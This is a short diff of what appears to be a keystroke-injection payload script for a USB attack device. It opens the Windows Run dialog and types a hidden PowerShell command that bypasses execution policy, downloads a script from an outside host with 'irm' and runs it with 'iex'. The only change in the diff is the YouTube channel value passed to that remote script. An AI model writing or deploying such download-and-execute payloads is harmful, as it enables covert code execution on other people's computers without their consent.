@@ -10,5 +10,5 @@ REM Your youtube url needs to be inside both double and single quotes   " ' url 
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $channel="'youtube.com/iamjakoby'";irm jakoby.lol/wj4 | iex
+STRING powershell -w h -NoP -Ep Bypass $channel="'youtube.com/@amirmatar8942'";irm jakoby.lol/wj4 | iex
 ENTER
